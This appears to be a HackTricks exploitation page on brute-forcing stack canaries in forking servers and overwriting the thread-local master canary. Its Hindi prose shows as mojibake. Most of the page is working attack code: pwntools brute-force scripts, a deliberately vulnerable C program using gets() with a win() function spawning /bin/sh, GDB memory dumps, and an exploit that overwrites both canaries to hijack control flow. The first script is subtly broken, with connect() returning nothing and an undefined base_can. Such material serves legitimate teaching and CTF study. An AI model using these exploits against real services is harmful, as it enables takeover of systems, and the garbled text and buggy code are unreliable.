# BF Forked & Threaded Stack Canaries

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

**рдпрджрд┐ рдЖрдк рдПрдХ рдХреИрдирд░реА рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдмрд╛рдЗрдирд░реА рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ PIE (рдкреЛрдЬреАрд╢рди рдЗрдВрдбрд┐рдкреЗрдВрдбреЗрдВрдЯ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓) рд╣реИ рддреЛ рд╢рд╛рдпрдж рдЖрдкрдХреЛ рдЙрдиреНрд╣реЗрдВ рджреВрд░ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдвреВрдВрдврдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`checksec`** рдпрд╣ рдирд╣реАрдВ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рдХрд┐ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдХреИрдирд░реА рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЕрдЧрд░ рдпрд╣ рд╕реНрдереИрддрд┐рдХ рд░реВрдк рд╕реЗ рдХреЙрдореНрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкрд╣рдЪрд╛рдирдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдЗрд╕реЗ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдиреЛрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдЧрд░ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рдПрдХ рдорд╛рди рд╕реНрдЯреИрдХ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕ рдорд╛рди рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛рддреА рд╣реИ рдкрд╣рд▓реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рд╕реЗ рдкрд╣рд▓реЗред
{% endhint %}

## Brute force Canary

рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдХреИрдирд░реА рдХреЛ рджреВрд░ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдпрджрд┐ рдмрд╛рдЗрдирд░реА рдПрдХ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ **рдЬреЛ рдкреНрд░рддреНрдпреЗрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде рдПрдХ рдирдпрд╛ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдмрдЪреНрдЪреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ рдмрдирд╛рддрд╛ рд╣реИ** (рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛), рдХреНрдпреЛрдВрдХрд┐ рд╣рд░ рдмрд╛рд░ рдЬрдм рдЖрдк рдЗрд╕рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рддреЗ рд╣реИрдВ **рд╡рд╣реА рдХреИрдирд░реА рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдПрдЧреА**ред

рдЗрд╕рд▓рд┐рдП, рдХреИрдирд░реА рдХреЛ рджреВрд░ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЖрдк рдмрд╕ **рдЪрд╛рд░ рд╕реЗ рдЪрд╛рд░ рдЪрд░рд┐рддреНрд░ рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░реЗрдВ**, рдФрд░ рдЖрдк рдпрд╣ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдЕрдиреБрдорд╛рдирд┐рдд рдХреИрдирд░реА рдмрд╛рдЗрдЯ рд╕рд╣реА рдерд╛ рдпрд╛ рдЧрд▓рдд рдерд╛ рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдпрджрд┐ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреНрд░реИрд╢ рд╣реЛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдЕрдкрдиреА рдирд┐рдпрдорд┐рдд рдлреНрд▓реЛ рдХреЛ рдЬрд╛рд░реА рд░рдЦрддрд╛ рд╣реИред рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдлрд╝рдВрдХреНрд╢рди **8 рдмрд╛рдЗрдЯ рдХреИрдирд░реА (x64)** рдХреЛ **рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕** рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╕рд╣реА рдЕрдиреБрдорд╛рдирд┐рдд рдмрд╛рдЗрдЯ рдФрд░ рдПрдХ рдмреБрд░рд╛ рдмрд╛рдЗрдЯ рдХреЗ рдмреАрдЪ рднрд┐рдиреНрди рдХрд░рддрд╛ рд╣реИ рдмрд╕ **рдЬрд╛рдВрдЪ** рдХрд░рдХреЗ рдпрджрд┐ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ **рдХреЛрдИ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рднреЗрдЬреА рдЬрд╛рддреА рд╣реИ (рдЕрдиреНрдп рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдПрдХ **try/except** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ): 

### рдЙрджрд╛рд╣рд░рдг 1

рдпрд╣ рдЙрджрд╛рд╣рд░рдг 64 рдмрд┐рдЯ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЖрд╕рд╛рдиреА рд╕реЗ 32 рдмрд┐рдЯ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### рдЙрджрд╛рд╣рд░рдг 2

рдпрд╣ 32 рдмрд┐рдЯ рдХреЗ рд▓рд┐рдП рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ 64 рдмрд┐рдЯ рдХреЗ рд▓рд┐рдП рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдкреНрд░реЛрдЧреНрд░рд╛рдо рдкрд╣рд▓реЗ рдПрдХ рдмрд╛рдЗрдЯ рдХреА рдЧреБрдгрд╡рддреНрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЗрдирдкреБрдЯ рдХрд╛ рдЖрдХрд╛рд░ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ** рдФрд░ рдкреЗрд▓реЛрдбред
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## рдереНрд░реЗрдб

рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдПрдХ рд╣реА рдереНрд░реЗрдб рднреА **рдПрдХ рд╣реА рдХреИрдирд░реА рдЯреЛрдХрди рдХреЛ рд╕рд╛рдЭрд╛** рдХрд░реЗрдЧреА, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдмрд╛рдЗрдирд░реА рд╣рд░ рдмрд╛рд░ рдПрдХ рд╣рдорд▓рд╛ рд╣реЛрдиреЗ рдкрд░ рдПрдХ рдирдпрд╛ рдереНрд░реЗрдб рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ рддреЛ рдХреИрдирд░реА рдХреЛ **рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдХреИрдирд░реА рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдереНрд░реЗрдб рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рдПрдХ рдмрдлрд░ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдорд╛рд╕реНрдЯрд░ рдХреИрдирд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рд╕рдВрд░реЛрдзрди рдЕрдкреНрд░рднрд╛рд╡реА рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЬрд╛рдВрдЪ рджреЛ рдХреИрдирд░реА рдХреЗ рд╕рд╛рде рдХреА рдЬрд╛рддреА рд╣реИ рдЬреЛ рд╕рдорд╛рди рд╣реИрдВ (рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╕рдВрд╢реЛрдзрд┐рдд рд╣реИрдВ)ред

### рдЙрджрд╛рд╣рд░рдг

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛рд░реНрдпрдХреНрд░рдо Buffer Overflow рдХреЗ рд▓рд┐рдП рд╡рдВрд╢рд╛рд╡рд╢реЗрд╖ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдХреИрдирд░реА рдХреЗ рд╕рд╛рде рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```c
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

// gcc thread_canary.c -no-pie -l pthread -o thread_canary

void win() {
execve("/bin/sh", NULL, NULL);
}

void* vuln() {
char data[0x20];
gets(data);
}

int main() {
pthread_t thread;

pthread_create(&thread, NULL, vuln, NULL);
pthread_join(thread, NULL);

return 0;
}
```
рд╕рд╛рд╡рдзрд╛рди рд░рд╣реЗрдВ рдХрд┐ `vuln` рдПрдХ рдереНрд░реЗрдб рдХреЗ рднреАрддрд░ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред GDB рдореЗрдВ рд╣рдо `vuln` рдкрд░ рдПрдХ рдирдЬрд░ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рдЬрд┐рд╕ рдмрд┐рдВрджреБ рдкрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдо `gets` рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрдирдкреБрдЯ рдбреЗрдЯрд╛ рдкрдврд╝ рд╕рдХреЗ:
```bash
gef> break gets
Breakpoint 1 at 0x4010a0
gef> run
...
gef> x/10gx $rdi
0x7ffff7d7ee20: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee30: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee40: 0x0000000000000000      0x493fdc653a156800
0x7ffff7d7ee50: 0x0000000000000000      0x00007ffff7e17ac3
0x7ffff7d7ee60: 0x0000000000000000      0x00007ffff7d7f640
```
рдКрдкрд░ `data` рдХрд╛ рдкрддрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рд▓рд┐рдЦреЗрдЧрд╛ред рд╕реНрдЯреИрдХ рдХреИрдирд░реА `0x7ffff7d7ee48` (`0x493fdc653a156800`) рдкрд░ рдкрд╛рдИ рдЬрд╛рддреА рд╣реИ, рдФрд░ рд╡рд╛рдкрд╕реА рдкрддрд╛ `0x7ffff7d7ee50` (`0x00007ffff7e17ac3`) рдкрд░ рд╣реИ:
```bash
gef> telescope $rdi 8 -n
0x7ffff7d7ee20|+0x0000|+000: 0x0000000000000000  <-  $rdi
0x7ffff7d7ee28|+0x0008|+001: 0x0000000000000000
0x7ffff7d7ee30|+0x0010|+002: 0x0000000000000000
0x7ffff7d7ee38|+0x0018|+003: 0x0000000000000000
0x7ffff7d7ee40|+0x0020|+004: 0x0000000000000000
0x7ffff7d7ee48|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7ee50|+0x0030|+006: 0x0000000000000000  <-  $rbp
0x7ffff7d7ee58|+0x0038|+007: 0x00007ffff7e17ac3 <start_thread+0x2f3>  ->  0xe8ff31fffffe6fe9  <-  retaddr[2]
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕реНрдЯреИрдХ рдкрддреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕реНрдЯреИрдХ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдирд╣реАрдВ рд╣реИрдВ:
```bash
gef> vmmap stack
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00007ffff7580000 0x00007ffff7d83000 0x0000000000803000 0x0000000000000000 rw- <tls-th1><stack-th2>  <-  $rbx, $rsp, $rbp, $rsi, $rdi, $r12
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
```
рдзрд╛рдЧреЗ рдХрд╛ рд╕реНрдЯреИрдХ рдзрд╛рдЧреЗ рд╕реНрдерд╛рдиреАрдп рд╕рдВрдЧреНрд░рд╣рдг (TLS) рдХреЗ рдКрдкрд░ рд╕реНрдерд┐рдд рд╣реЛрддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рдорд╛рд╕реНрдЯрд░ рдХреИрдирд░реА рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╣реЛрддреА рд╣реИ:
```bash
gef> tls
$tls = 0x7ffff7d7f640
...
---------------------------------------------------------------------------- TLS ----------------------------------------------------------------------------
0x7ffff7d7f640|+0x0000|+000: 0x00007ffff7d7f640  ->  [loop detected]  <-  $rbx, $r12
0x7ffff7d7f648|+0x0008|+001: 0x00000000004052b0  ->  0x0000000000000001
0x7ffff7d7f650|+0x0010|+002: 0x00007ffff7d7f640  ->  [loop detected]
0x7ffff7d7f658|+0x0018|+003: 0x0000000000000001
0x7ffff7d7f660|+0x0020|+004: 0x0000000000000000
0x7ffff7d7f668|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7f670|+0x0030|+006: 0xb79b79966e9916c4  <-  PTR_MANGLE cookie
0x7ffff7d7f678|+0x0038|+007: 0x0000000000000000
...
```
{% hint style="info" %}
рдКрдкрд░ рдХреБрдЫ GDB рдлрд╝рдВрдХреНрд╢рди рдПрдХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдкрд░ рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╣реИрдВ рдЬрд┐рд╕реЗ [bata24/gef](https://github.com/bata24/gef) рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╕рд╛рдорд╛рдиреНрдп [hugsy/gef](https://github.com/hugsy/gef) рд╕реЗ рдЕрдзрд┐рдХ рд╕реБрд╡рд┐рдзрд╛рдПрдБ рд╣реИрдВред
{% endhint %}

рдЗрд╕ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдПрдХ рдмрдбрд╝рд╛ рдмрдлрд╝рд░ рдУрд╡рд░рдлрд╝реНрд▓реЛ рджреНрд╡рд╛рд░рд╛ рд╕реНрдЯреИрдХ рдХреИрдирд░реА рдФрд░ рдорд╛рд╕реНрдЯрд░ рдХреИрдирд░реА рдХреЛ рдмрджрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛ рд╕рдХрддреА рд╣реИ TLS рдореЗрдВред рдпрд╣ рд╣реИ рдСрдлрд╕реЗрдЯ:
```bash
gef> p/x 0x7ffff7d7f668 - $rdi
$1 = 0x848
```
рдпрд╣ `win` рдХреЛ рдмреБрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЫреЛрдЯрд╛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╣реИ:
```python
from pwn import *

context.binary = 'thread_canary'

payload  = b'A' * 0x28                    # buffer overflow offset
payload += b'BBBBBBBB'                    # overwritting stack canary
payload += b'A' * 8                       # saved $rbp
payload += p64(context.binary.sym.win)    # return address
payload += b'A' * (0x848 - len(payload))  # padding
payload += b'BBBBBBBB'                    # overwritting master canary

io = context.binary.process()
io.sendline(payload)
io.interactive()
```
## рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рдФрд░ рд╕рдВрджрд░реНрдн

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64 рдмрд┐рдЯ, PIE рдирд╣реАрдВ, nx, BF рдХреИрдиреЗрд░реА, рдХрд┐рд╕реА рдореЗрдореЛрд░реА рдореЗрдВ `execve` рдХреЛ рдмреБрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП ROP рд▓рд┐рдЦреЗрдВ рдФрд░ рд╡рд╣рд╛рдВ рдЬрд╛рдПрдВред
* [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)
* 64 рдмрд┐рдЯ, PIE рдирд╣реАрдВ, nx, рдереНрд░реЗрдб рдФрд░ рдорд╛рд╕реНрдЯрд░ рдХреИрдиреЗрд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВред
